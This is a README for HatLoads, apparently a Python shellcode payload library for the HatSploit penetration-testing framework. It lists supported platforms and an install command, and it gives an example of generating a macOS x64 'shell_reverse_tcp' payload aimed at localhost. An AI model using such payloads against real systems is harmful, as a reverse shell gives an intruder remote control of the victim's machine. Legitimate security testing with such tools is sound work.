# HatLoads

<p>
    <a href="https://entysec.netlify.app">
        <img src="https://img.shields.io/badge/developer-EntySec-3572a5.svg">
    </a>
    <a href="https://github.com/EntySec/HatLoads">
        <img src="https://img.shields.io/badge/language-Python-3572a5.svg">
    </a>
    <a href="https://github.com/EntySec/HatLoads/stargazers">
        <img src="https://img.shields.io/github/stars/EntySec/HatLoads?color=yellow">
    </a>
</p>

HatSploit collection of generic payloads designed to provide a wide range of attacks without having to spend time writing new ones.

## Features

* Contains a lot of useful shellcodes in assembly and bytes.
* Support for most common platforms like `macOS`, `Linux`, `Windows`.
* Ability to get custom code and assemble it.

## Installation

```shell
pip3 install git+https://github.com/EntySec/HatLoads
```

## Basic functions

There are all HatLoads basic functions that can be used to generate payloads.

* `get_payload(self, platform, arch, payload, options={}, assemble=True)` - Get assembly shellcode or assembled shellcode.

## Examples

```python3
from hatloads import HatLoads

options = {
    'RHOST': '127.0.0.1',
    'RPORT': 8888
}

hatloads = HatLoads()
shellcode = hatloads.get_payload(
    'macos',
    'x64',
    'shell_reverse_tcp',
    options
)
```
